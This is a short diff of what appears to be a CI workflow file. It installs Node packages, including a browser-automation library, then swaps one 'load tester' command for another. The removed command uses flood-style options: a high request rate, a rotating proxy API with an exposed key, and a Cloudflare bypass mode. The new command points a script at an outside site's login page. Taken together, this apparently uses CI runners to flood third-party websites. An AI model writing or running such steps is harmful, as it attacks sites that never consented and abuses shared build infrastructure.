@@ -33,11 +33,11 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install   socks axios chalk@4 colors request  hpack  https commander colors
+        run: npm install   socks axios chalk@4 colors request  hpack  https commander colors puppeteer-real-browser
             
       - name: Run HTTP/3 load tester
         run: |
-          node yo.js -m GET -u https://c3.dstatbot.win/BUdpA7C6 -s 700 -t 4 -r 2000 --proxyapi "https://proxyapi.sswc.cfd/api.php?key=ay4t9b1w0s" -T http -v 2 --full true --extra true -q true -C CLOUDFLARE  -F true --reset true --close true -d true
+          node m.js https://tradelinksfx.net/login 200 3 3 3
           
           
         env:
